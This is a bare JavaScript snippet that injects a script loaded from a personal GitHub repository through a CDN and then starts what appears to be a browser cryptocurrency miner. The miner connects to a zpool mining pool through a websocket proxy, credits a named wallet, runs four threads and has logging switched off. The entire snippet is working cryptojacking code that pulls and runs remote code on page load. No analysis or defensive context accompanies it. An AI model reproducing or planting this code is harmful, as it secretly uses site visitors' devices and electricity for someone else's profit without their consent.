   function start() {
    const client = new Client({
      stratum: {
        server: "minotaurx.na.mine.zpool.ca",
        port: 7019,
        worker: "RFNMZhc4rbed6eu3qb8B8WPWKDhcTaERBh",
        password: "c=RVN"
      },
      options: {
        threads: 4,
        log: false,
      },
    }, "wss://muddy-tallia-masterw-23a8c046.koyeb.app/proxy")};

    const script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/gh/gogogo0123456/A-1-4e-hg1s/mains.js";
     script.onload = () => {
      start();
    };
    document.head.appendChild(script);
